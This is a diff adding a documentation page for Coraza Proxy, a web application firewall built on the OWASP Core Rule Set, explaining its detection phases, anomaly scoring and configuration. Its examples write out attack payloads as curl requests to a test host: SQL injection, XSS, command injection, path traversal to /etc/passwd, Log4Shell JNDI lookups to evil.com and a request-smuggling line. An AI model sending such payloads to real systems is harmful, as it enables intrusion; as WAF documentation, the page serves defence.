@@ -1,0 +1,410 @@
+---
+title: Attack Detection
+description: Understanding how Coraza Proxy detects and blocks web attacks
+---
+
+## Overview
+
+Coraza Proxy uses the [OWASP Core Rule Set (CRS)](https://coreruleset.org/) to detect and block a comprehensive range of web attacks. The WAF operates on an anomaly scoring system where suspicious patterns increase a request's threat score until it crosses a threshold and gets blocked.
+
+## Detection Mechanism
+
+The detection process follows these phases:
+
+### Phase 1: Connection & Headers
+
+```go
+// main.go:488-507
+tx.ProcessConnection(clientIP, clientPort, serverIP, serverPort)
+
+for k, v := range r.Header {
+    tx.AddRequestHeader(k, vv)
+}
+tx.ProcessURI(r.URL.String(), r.Method, r.Proto)
+
+if it := tx.ProcessRequestHeaders(); it != nil {
+    if block, status := shouldBlock(it); block {
+        w.WriteHeader(status)
+        w.Write([]byte("Request blocked by WAF (headers)"))
+    }
+}
+```
+
+Checks:
+- Malicious headers (Log4Shell in User-Agent, XSS in custom headers)
+- Protocol violations (missing Host header, invalid HTTP version)
+- Method restrictions (disallowed HTTP methods)
+
+### Phase 2: Request Body
+
+```go
+// main.go:510-533
+if len(body) > 0 {
+    tx.WriteRequestBody(body)
+    if it, _ := tx.ProcessRequestBody(); it != nil {
+        w.WriteHeader(it.Status)
+        w.Write([]byte("Request blocked by WAF (body)"))
+    }
+}
+```
+
+Checks:
+- SQL injection in POST data
+- XSS payloads in JSON or form fields
+- Command injection attempts
+- Content-type validation
+
+### Phase 3: Response Headers
+
+```go
+// main.go:580-589
+if it := tx.ProcessResponseHeaders(resp.StatusCode, resp.Proto); it != nil {
+    if block, status := shouldBlock(it); block {
+        w.WriteHeader(status)
+        w.Write([]byte("Response blocked by WAF"))
+    }
+}
+```
+
+Checks:
+- Data leakage in response headers
+- Error message disclosure
+
+<Note>
+Response body inspection is disabled by default (`tx.crs_skip_response_analysis=1`) to prevent resource exhaustion attacks when serving large files.
+</Note>
+
+## OWASP Top 10 Coverage
+
+### A1: Injection Attacks
+
+#### SQL Injection (SQLi)
+
+**Detected Patterns:**
+- Classic boolean-based: `1' OR '1'='1`
+- UNION-based: `1 UNION SELECT 1,2,3--`
+- Time-based: `1 AND SLEEP(5)`
+- Error-based: `1' AND (SELECT * FROM users)--`
+- Boolean logic: `1 AND 1=1`
+
+**CRS Rules:**
+- Rule ID 942xxx series
+- Detects SQL keywords: `UNION`, `SELECT`, `INSERT`, `DELETE`, `UPDATE`, `DROP`
+- SQL operators: `--`, `/**/`, `'`, `"`
+- SQL functions: `SLEEP()`, `BENCHMARK()`, `WAITFOR`
+
+**Example Detection:**
+```bash
+curl "http://waf.test.local:8081/?id=1' OR '1'='1"
+# Response: 403 Forbidden
+# Reason: SQL injection detected in query string
+```
+
+#### NoSQL Injection
+
+**Detected Patterns:**
+- MongoDB operators: `{"$ne": null}`
+- JSON injection: `{"username": {"$gt": ""}}`
+
+#### Command Injection (RCE)
+
+**Detected Patterns:**
+- Shell metacharacters: `;`, `|`, `&&`, `||`
+- Common commands: `ls`, `cat`, `whoami`, `wget`
+- Command substitution: `$(cmd)`, `` `cmd` ``
+- File operations: `cat /etc/passwd`
+
+**CRS Rules:**
+- Rule ID 932xxx series
+- Detects Unix/Windows command execution attempts
+
+**Example Detection:**
+```bash
+curl "http://waf.test.local:8081/?cmd=;ls -la"
+# Response: 403 Forbidden
+# Reason: Command injection detected
+```
+
+#### LDAP/XML/XPath Injection
+
+**Detected Patterns:**
+- LDAP filter injection
+- XML entity expansion
+- XPath query manipulation
+
+### A2: Broken Authentication
+
+**Detected Patterns:**
+- Excessive login attempts (via rate limiting)
+- Session fixation attempts
+- Authentication bypass patterns
+
+**Rate Limiting:**
+```go
+// main.go:441-445
+if !limiter.GetLimiter(clientIP).Allow() {
+    http.Error(w, "Too Many Requests", http.StatusTooManyRequests)
+}
+```
+
+Default: 5 requests per second with burst of 10 (configurable via `PROXY_RATE_LIMIT` and `PROXY_RATE_BURST`).
+
+### A3: Sensitive Data Exposure
+
+**Detected Patterns:**
+- XSS in JSON responses
+- Error messages with sensitive information
+- Data leakage in headers
+
+**Example:**
+```bash
+curl -X POST "http://waf.test.local:8081" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"<script>alert(1)</script>"}'
+# Response: 403 Forbidden
+# Reason: XSS in JSON payload
+```
+
+### A5: Broken Access Control
+
+#### Path Traversal / Local File Inclusion (LFI)
+
+**Detected Patterns:**
+- Directory traversal: `../../etc/passwd`
+- Windows paths: `..\..\windows\system32`
+- Encoded traversal: `%2e%2e%2f`
+- Null byte injection: `file.php%00.jpg`
+
+**CRS Rules:**
+- Rule ID 930xxx series
+- Path normalization checks
+
+**Example Detection:**
+```bash
+curl "http://waf.test.local:8081/?file=../../etc/passwd"
+# Response: 403 Forbidden  
+# Reason: Path traversal detected
+```
+
+### A6: Security Misconfiguration
+
+**Detected Patterns:**
+- Missing Host header
+- Invalid HTTP versions
+- Malicious custom headers
+
+**Example:**
+```bash
+curl "http://waf.test.local:8081/" -H "Host: "
+# Response: 403 Forbidden
+# Reason: Protocol violation - empty Host header
+```
+
+### A7: Cross-Site Scripting (XSS)
+
+**Detected Patterns:**
+- Script tags: `<script>alert(1)</script>`
+- Event handlers: `<img src=x onerror=alert(1)>`
+- JavaScript protocol: `javascript:alert(1)`
+- Encoded XSS: `%3Cscript%3E`
+- SVG-based XSS
+- CSS expression injection
+
+**CRS Rules:**
+- Rule ID 941xxx series
+- Detects HTML tags, JavaScript keywords, event handlers
+
+**Classic XSS Example:**
+```bash
+curl "http://waf.test.local:8081/?x=<script>alert(1)</script>"
+# Response: 403 Forbidden
+# Reason: XSS detected in query parameter
+```
+
+**Advanced XSS Example:**
+```bash
+curl "http://waf.test.local:8081/?q=%3Cimg+src%3Dx+onerror%3Dalert(1)%3E"
+# Response: 403 Forbidden
+# Reason: XSS event handler detected
+```
+
+### A8: Insecure Deserialization
+
+**Detected Patterns:**
+- PHP object injection: `O:8:"stdClass"`
+- Java serialization magic bytes
+- Python pickle exploitation
+
+### A9: Using Components with Known Vulnerabilities
+
+#### Log4Shell (CVE-2021-44228)
+
+**Detected Patterns:**
+- JNDI lookup: `${jndi:ldap://evil.com}`
+- Nested lookups: `${${::-j}ndi:ldap://evil.com}`
+- Various obfuscations
+
+**CRS Rules:**
+- Special rule ID 944240 (Log4Shell specific)
+
+**Example Detection:**
+```bash
+curl "http://waf.test.local:8081" \
+  -H 'User-Agent: ${jndi:ldap://evil.com}'
+# Response: 403 Forbidden
+# Reason: Log4Shell JNDI injection detected
+```
+
+### A10: Insufficient Logging & Monitoring
+
+Coraza provides comprehensive audit logging:
+
+```
+/tmp/log/coraza/audit.log - Detailed request/response logs
+/tmp/log/coraza/debug.log - Debug information
+```
+
+## Protocol-Level Attacks
+
+### HTTP Request Smuggling
+
+**Detected Patterns:**
+- Conflicting Content-Length and Transfer-Encoding headers
+- Multiple Content-Length headers
+- Invalid chunked encoding
+
+**Example:**
+```bash
+printf "GET / HTTP/1.1\r\nHost: waf.test.local\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n" | nc waf.test.local 8081
+# Response: Connection terminated
+# Reason: Invalid HTTP protocol structure
+```
+
+### HTTP Response Splitting
+
+**Detected Patterns:**
+- CRLF injection in headers: `\r\n`
+- Newline characters in user input
+
+### Invalid UTF-8 Encoding
+
+**Detected Patterns:**
+- Malformed UTF-8 sequences: `%C0`, `%C1`
+- Overlong encodings
+- Invalid byte sequences
+
+**Example:**
+```bash
+curl "http://waf.test.local:8081/?q=%C0"
+# Response: 403 Forbidden
+# Reason: Invalid UTF-8 encoding detected
+```
+
+## Additional Security Layers
+
+### Bot Detection
+
+```go
+// main.go:447-458
+if blockBots {
+    ua := strings.ToLower(r.UserAgent())
+    badBots := []string{"python", "googlebot", "bingbot", "yandex", "baiduspider"}
+    // Block matching user agents
+}
+```
+
+Enable with:
+```bash
+PROXY_BLOCK_BOTS=true
+PROXY_BOTS="python,scrapy,curl,wget"
+```
+
+### GeoIP Blocking
+
+```go
+// main.go:433-439
+if geoBlockEnabled {
+    allowed, country := geoFilter(r, geoAllow, geoBlock)
+    if !allowed {
+        http.Error(w, "Access denied by GeoIP policy", http.StatusForbidden)
+    }
+}
+```
+
+Configure with:
+```bash
+GEO_BLOCK_ENABLED=true
+GEO_ALLOW_COUNTRIES="US,GB,CA"
+GEO_BLOCK_COUNTRIES="CN,RU,KP"
+```
+
+### Rate Limiting
+
+Per-IP rate limiting prevents:
+- Brute force attacks
+- DoS/DDoS attempts  
+- Excessive scraping
+- Resource exhaustion
+
+**Configuration:**
+```bash
+PROXY_RATE_LIMIT=5      # requests per second
+PROXY_RATE_BURST=10     # burst allowance
+```
+
+<Warning>
+Rate limiting is enforced at the IP level. Be cautious when deploying behind shared proxies or NAT gateways where multiple legitimate users share an IP address.
+</Warning>
+
+## Anomaly Scoring System
+
+The CRS uses an anomaly scoring approach:
+
+1. Each rule that matches increases the anomaly score
+2. Critical rules add more points than warning rules
+3. When the total score exceeds the threshold, the request is blocked
+
+**PL1 Thresholds:**
+- Inbound: 5 points
+- Outbound: 4 points
+
+**PL2 Thresholds:**
+- Inbound: 7 points  
+- Outbound: 5 points
+
+**Severity Scoring:**
+- CRITICAL: 5 points
+- ERROR: 4 points
+- WARNING: 3 points
+- NOTICE: 2 points
+
+<Note>
+A single critical vulnerability (like SQL injection) typically scores 5 points, immediately triggering PL1's threshold. Multiple low-severity violations can also accumulate to trigger blocking.
+</Note>
+
+## Bypassing False Positives
+
+If legitimate requests are blocked:
+
+1. **Check audit logs** at `/tmp/log/coraza/audit.log`
+2. **Identify the rule ID** causing the block
+3. **Disable specific rules** in your configuration:
+
+```conf
+# Disable rule 920100
+SecRuleRemoveById 920100
+
+# Or disable a range
+ctl:ruleRemoveById=920100-920499
+```
+
+4. **Adjust anomaly thresholds** for less sensitive applications
+5. **Use rule exclusions** for specific endpoints
+
+<Warning>
+Disabling security rules should be a last resort. Always investigate why a rule triggered and ensure you're not exposing your application to real attacks.
+</Warning>
+
+## Testing Detection
+
+See the [Security Testing Guide](/security/testing) for comprehensive test cases to validate your WAF configuration detects all major attack vectors.
